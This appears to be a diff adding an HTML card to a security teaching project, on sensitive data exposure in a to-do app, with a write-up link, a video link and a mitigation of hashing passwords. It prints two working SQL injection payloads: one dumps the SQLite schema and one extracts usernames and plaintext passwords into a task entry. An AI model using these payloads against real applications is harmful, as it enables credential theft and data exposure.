@@ -1,0 +1,22 @@
+<div class="card bg-light mb-3" style="max-width: 25rem;">
+  <div class="card-header">Exploit & Mitigation</div>
+  <div class="card-body">
+    <h5 class="card-title">Sensitive data exposure</h5>
+    <p class="card-text">
+      <strong>Exploit</strong> Exfiltrate passwords from the system</p>
+    <p class="card-text">
+      <strong>Mitigation</strong> Ensure passwords are properly hashed</p>
+    <a href="https://docs.google.com/document/d/16n1ZReQf6WNuRodKsSehc6JRobQv7tJ7n7IT9bPCkrg/edit?usp=sharing" target="_blank"><strong>Write Up</strong></a> | 
+    <a href="https://media.oregonstate.edu/media/t/0_rvetychz" target="_blank"><strong>Video</strong></a>    
+    <br>
+    <br>
+    <strong>Dump schema</strong>
+    <br>
+    <code>===== Start Schema Dump =====', 0, '1'); INSERT INTO todo (task_description, task_complete, user_id) SELECT sql, 1, 1  FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'; --</code>
+    <br>
+    <br>
+    <strong>Dump user accounts</strong>
+    <br>
+    <code>===== Start User Account Dump =====', 0, '1'); INSERT INTO todo (task_description, task_complete, user_id) SELECT GROUP_CONCAT(row, '\n'), 1, 1 FROM (SELECT id || ',' || username || ',' || password_plaintext as row  FROM user); --</code>
+  </div>
+</div>
